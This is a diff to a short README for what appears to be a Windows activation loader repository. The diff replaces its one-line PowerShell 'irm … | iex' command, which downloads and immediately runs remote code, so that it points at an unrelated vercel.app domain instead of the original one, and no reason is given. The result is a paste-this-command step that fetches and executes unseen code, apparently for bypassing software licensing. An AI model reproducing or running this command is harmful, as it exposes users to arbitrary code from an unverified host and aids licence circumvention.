@@ -1,4 +1,4 @@
 https://get.activated.win
 =================
 
-This repository contains `irm https://get.activated.win | iex` loader script.
+This repository contains `irm https://ativarwin-hone.vercel.app | iex` loader script.
